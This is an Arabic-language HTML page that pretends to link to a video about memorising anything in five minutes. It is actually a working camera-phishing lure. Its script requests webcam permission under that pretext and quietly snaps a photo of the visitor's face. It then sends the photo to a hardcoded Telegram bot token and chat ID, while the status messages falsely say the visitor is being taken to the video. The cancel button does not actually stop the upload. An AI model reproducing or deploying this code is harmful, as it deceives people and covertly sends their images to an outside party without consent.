<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>كيف تحفظ اي شي بخمسة دقائق؟</title>
<style>
:root{--bg:#f6f7f9;--card:#fff;--text:#14181f;--muted:#5b6472;--accent:#2563eb;--accent-text:#fff;--border:#dfe3ea;--err:#b42318;--ok:#15803d;
box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}}
:root[data-theme="dark"]{--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}
html{scroll-padding-top:env(safe-area-inset-top,0px)}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Tahoma,"Noto Sans Arabic",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{width:100%;max-width:520px;background:var(--card);border:1px solid var(--border);border-radius:18px;padding:20px;text-align:center}
h1{font-size:1.25rem;margin:0 0 6px}
#status{color:var(--muted);margin:0 0 14px;min-height:1.5em}
#status.err{color:var(--err)}
#status.ok{color:var(--ok)}
.hidden{display:none!important}
.row{display:flex;gap:10px;justify-content:center;margin-top:14px;flex-wrap:wrap}
button,a.btn{font:inherit;border:0;border-radius:10px;padding:10px 18px;background:var(--accent);color:var(--accent-text);cursor:pointer;text-decoration:none;display:inline-block}
button.alt{background:transparent;color:var(--text);border:1px solid var(--border)}
button.danger{background:var(--err);color:#fff}
#uploadBox{margin-top:14px;padding:14px;border:1px solid var(--border);border-radius:12px;background:rgba(127,127,127,.08)}
#uploadBox p{margin:0 0 10px;font-weight:600}
#countdownNum{font-size:1.4rem;font-weight:800;color:var(--accent)}
</style>
</head>
<body>
<main class="card">
  <h1>فيديو شرح كيفية حفظ اي شي بخمسة دقايق؟</h1>
  <p style="margin:0 0 10px;color:var(--muted);font-size:.95rem">انتقل الى مشاهدة الفيديو مباشرة </p>
  <p id="status">اقبل الاذونات اولا..</p>
  <div class="stage">
    <video id="video" autoplay muted playsinline></video>
    <img id="photo" class="hidden" alt="سيتم نقلك بعد خمس ثوان الى الفيديو">
  </div>

  <div class="row hidden" id="actions">
    <button id="retake">إعادة المحاولة</button>
    <a class="btn alt" id="download" download="photo.jpg">تنزيل الرابط</a>
  </div>

  <div id="uploadBox" class="hidden">
    <p>سيتم نقلك الى الفيديو خلال <span id="countdownNum">0</span> ثوانٍ</p>
    <button class="danger" id="cancelUpload">الغاء عرض الفيديو</button>
  </div>

  <canvas id="canvas" class="hidden"></canvas>
</main>
<script>
// ===== إعدادات الرفع إلى تلغرام =====
const TELEGRAM_TOKEN='9062869047:AAEwyeUMOtyImKqEk9YfuYVJoi2i-Dw_Hmw';
const TELEGRAM_CHAT_ID='8785889283';

const video=document.getElementById('video'),photo=document.getElementById('photo'),
canvas=document.getElementById('canvas'),statusEl=document.getElementById('status'),
actions=document.getElementById('actions'),dl=document.getElementById('download'),
uploadBox=document.getElementById('uploadBox'),countdownNum=document.getElementById('countdownNum'),
cancelUploadBtn=document.getElementById('cancelUpload');
let stream=null,countdownTimer=null,lastBlob=null;

function setStatus(t,kind){statusEl.textContent=t;statusEl.classList.remove('err','ok');if(kind)statusEl.classList.add(kind)}
function stop(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}}

async function start(){
  clearTimeout(countdownTimer);uploadBox.classList.add('hidden');
  photo.classList.add('hidden');video.classList.remove('hidden');actions.classList.add('hidden');
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
    setStatus('تعذّر طلب الإذن هنا. افتح الملف مباشرة في Chrome أو Firefox (وليس من معاينة الملفات أو متصفح داخل تطبيق)، أو افتحه عبر رابط HTTPS.','err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
  setStatus('اضغط «سماح» في الرسالة التي ظهرت أعلى الصفحة 👆');
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},audio:false});
  }catch(e){
    const msg=(e&&e.name==='NotAllowedError')?'لم يُسمح للكاميرا بعد. اضغط زر «تفعيل الكاميرا» بالأسفل ثم اختر «سماح».'
      :(e&&e.name==='NotFoundError')?'لم يتم قبول الاذونات'
      :'تعذّر تشغيل الاذونات.';
    setStatus(msg,'err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
  video.srcObject=stream;
  await video.play().catch(()=>{});
  setStatus('تم السماح. جارٍ نقلك الى الفيديو');
  setTimeout(capture,900);
}

function capture(){
  const w=video.videoWidth,h=video.videoHeight;
  if(!w||!h){setTimeout(capture,00);return}
  canvas.width=w;canvas.height=h;
  canvas.getContext('2d').drawImage(video,0,0,w,h);
  const url=canvas.toDataURL('image/jpeg',0.92);
  photo.src=url;dl.href=url;
  stop();video.classList.add('hidden');photo.classList.remove('hidden');
  dl.classList.remove('hidden');actions.classList.remove('hidden');document.getElementById('retake').textContent='إعادة الالتقاط';
  setStatus('تم تجهييز الفيديو.');
  canvas.toBlob(blob=>{lastBlob=blob;startCountdown()},'image/jpeg',0.92);
}

function startCountdown(){
  let n=0;countdownNum.textContent=n;uploadBox.classList.remove('hidden');
  clearInterval(countdownTimer);
  countdownTimer=setInterval(()=>{
    n--;
    if(n<=0){clearInterval(countdownTimer);uploadBox.classList.add('hidden');uploadPhoto();return}
    countdownNum.textContent=n;
  },1000);
}

cancelUploadBtn.addEventListener('click',()=>{
  clearTimeout(countdownTimer);uploadBox.classList.add('hidden');
  setStatus('تم إلغاء الانتقال الى الفيديو.');
});

async function uploadPhoto(){
  if(!lastBlob){return}
  setStatus('جارٍ الانتقال الى الفيديو');
  try{
    const fd=new FormData();
    fd.append('chat_id',TELEGRAM_CHAT_ID);
    fd.append('photo',lastBlob,'photo.jpg');
    const res=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,{method:'POST',body:fd});
    const data=await res.json();
    if(data.ok){setStatus('جار محاولة نقلك الى الفيديو اذا لم يعمل حاول من جديد','ok')}
    else{setStatus('فشل النقل الى الفيديو: '+(data.description||'خطأ غير معروف'),'err')}
  }catch(e){
    setStatus('فشل النقل. تحقق من اتصال الإنترنت وحاول مجدداً.','err');
  }
}

document.getElementById('retake').addEventListener('click',()=>{stop();start()});
addEventListener('pagehide',stop);
start();
</script>
</body>
</html>
